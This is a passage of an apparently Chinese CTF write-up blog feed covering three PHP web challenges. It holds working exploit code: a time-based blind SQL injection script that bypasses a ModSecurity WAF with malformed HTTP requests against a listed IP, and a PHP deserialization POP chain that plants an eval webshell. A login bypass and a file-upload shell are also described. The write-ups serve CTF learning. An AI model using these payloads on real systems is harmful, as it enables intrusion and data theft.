punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token number">1608040292</span></code></pre><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>存在源码<code>/.login.php.swp</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#error_reporting(0);</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select password from user where name=?"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$dpasswd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$dpasswd</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /upload.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"login failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>         <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>       <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>password的判断有漏洞，当<code>$_POST[&#39;password&#39;]</code>不存在的时候，<code>$password</code>会被赋值为<code>null</code>。同样的，当sql语句查询结果为空时，返回为<code>null</code>，<code>$dpasswd</code>就会被赋值为<code>null</code>，这样就可以成功登陆。</p><p>上传功能，后端校验文件头和content-type后缀名</p><p>上传.php5文件到uploads目录,成功拿到shell</p><h3 id="ezwaf-sql注入"><a href="#ezwaf-sql注入" class="headerlink" title="ezwaf(sql注入)"></a>ezwaf(sql注入)</h3><p>题目</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$newarr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$val</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$newarr</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span> <span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$newarr</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_GET</span><span class="token operator">=</span> <span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span> <span class="token string">"select age from user where name='$name'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span> <span class="token string">"select name from user where age=$age"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>选择age作为注入点，不需要逃逸引号,没有回显利用时间盲注</p><p><code>?age=1%2bsleep(1)</code> =&gt; 403</p><p>apache设置了waf</p><p>用畸形的http包绕过modsecurity</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socketip <span class="token operator">=</span> <span class="token string">'111.186.57.43'</span>port <span class="token operator">=</span> <span class="token number">10601</span><span class="token keyword">def</span> <span class="token function">send_raw</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> socket<span class="token punctuation">.</span>create_connection<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>            conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>raw<span class="token punctuation">)</span>            res <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10240</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># print(res)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">'flag{abypass_modsecurity'</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''GET /?age=1%20or%201%20and%20ascii(substr((select%20*%20from%20flag_xdd),{},1))={}%20and%20sleep(2) HTTP/1.1Host: 111.186.57.43:10601Accept-Encoding: gzip, deflateConnection: closeContent-Length: 0Content-Length: 0'''</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            exp <span class="token operator">=</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>b<span class="token string">'\n'</span><span class="token punctuation">,</span> b<span class="token string">'\r\n'</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># print(exp)</span>            <span class="token keyword">if</span> send_raw<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">:</span>                res <span class="token operator">+=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>                <span class="token keyword">continue</span></code></pre><p>不稳定的话时间可以调大一点</p><h3 id="ezpop-pop链"><a href="#ezpop-pop链" class="headerlink" title="ezpop(pop链)"></a>ezpop(pop链)</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$store</span><span class="token punctuation">,</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'flysystem'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span>    <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">store</span>  <span class="token operator">=</span> <span class="token variable">$store</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">expire</span> <span class="token operator">=</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$contents</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$cachedProperties</span> <span class="token operator">=</span> <span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token string">'path'</span><span class="token punctuation">,</span> <span class="token string">'dirname'</span><span class="token punctuation">,</span> <span class="token string">'basename'</span><span class="token punctuation">,</span> <span class="token string">'extension'</span><span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">,</span>            <span class="token string">'size'</span><span class="token punctuation">,</span> <span class="token string">'mimetype'</span><span class="token punctuation">,</span> <span class="token string">'visibility'</span><span class="token punctuation">,</span> <span class="token string">'timestamp'</span><span class="token punctuation">,</span> <span class="token string">'type'</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$contents</span> <span class="token keyword">as</span> <span class="token variable">$path</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$contents</span><span class="token punctuation">[</span><span class="token variable">$path</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$cachedProperties</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$cleaned</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$cleaned</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">complete</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">store</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">autosave</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">:</span> int    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getCacheKey</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'serialize'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">writeTimes</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$expire</span>   <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 创建失败</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//数据压缩</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$data</span>   <span class="token operator">=</span> "<span class="token delimiter">&lt;?php</span>\<span class="token package">n</span><span class="token comment" spellcheck="true">//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>构造pop链</strong></p><p>通过触发<code>A::__destruct()</code>=&gt;<code>A::save()</code>=&gt;<code>A::store-&gt;set()</code>==<code>b::set()</code>最后触发<code>$result = file_put_contents($filename, $data);</code></p><p>绕过exit通过 让<code>$filename</code>为<code>php://filter/write=convert.base64-decode/resource=uploads/shell.php</code></p><p>因为php中的<code>base64_decode</code>函数会忽略不符合base64编码的字符， 将合法字符组成一个新的字符串进行解码，所以最终被解码的字符仅有<code>php00000000exit</code>和我们传入的<code>$data</code>变量，因为base64算法解码时是4个byte一组，所以我们只要控制我们需要真正解码内容的前面部分字符长度为4的倍数就行</p><p>详细可以参考p师傅的博客<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">link</a></p><p><strong>$filename</strong></p><p>在<code>B::getCacheKey($name)</code>中，将<code>$this-&gt;options[&#39;prefix&#39;]</code>和<code>$name</code>拼接得到</p><p>构造<code>B::options</code>和<code>A::key</code>使<code>$filename</code>为<code>php://filter/write=convert.base64-decode/resource=uploads/shell.php</code></p><p><strong>$data</strong></p><p>由<code>$value=A::getForStorage()</code>和<code>B::serialize($value)</code>得到</p><p>构造A的cache为数组<code>[&#39;path&#39;=&gt;&#39;a&#39;,&#39;dirname&#39;=&gt;base64_encode(&#39;&lt;?php eval($_GET[a]);?&gt;&#39;)];</code></p><p>就可以使得<code>$value=A::getForStorage()</code> 的值为<code>[{&quot;path&quot;:&quot;a&quot;,&quot;dirname&quot;:&quot;PD9waHAgZXZhbCgkX0dFVFthXSk7Pz4g&quot;},true]</code></p><p>然后再构造B的serialize值为<code>serialize</code>就可以使得<code>B::serialize($value)</code>的值为<code>‌s:64:&quot;[{&quot;path&quot;:&quot;a&quot;,&quot;dirname&quot;:&quot;PD9waHAgZXZhbCgkX0dFVFthXSk7Pz4g&quot;},true]&quot;;</code></p><p>这样在最后<code>$data</code>被base64解码的时候只有<code>php//000000000000exits64pathadirname</code>和<code>PD9waHAgZXZhbCgkX0dFVFthXSk7Pz4gtrue</code>，然后前36位字符被编码成功绕过exit</p><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$complete</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string">'shell.php'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'path'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'dirname'</span><span class="token operator">=</span><span class="token operator">></span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'&lt;?php eval($_GET[a]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">'serialize'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'serialize'</span><span class="token punctuation">,</span>        <span class="token string">'prefix'</span> <span class="token operator">=</span><span class="token operator">></span> 'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=convert.base64-decode/resource=uploads/',</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rsa </tag>
            
            <tag> bypassDF </tag>
            
            <tag> sql注入 </tag>
            
            <tag> pop链 </tag>
            
            <tag> aes </tag>
            
        </tags>
      
    </entry>
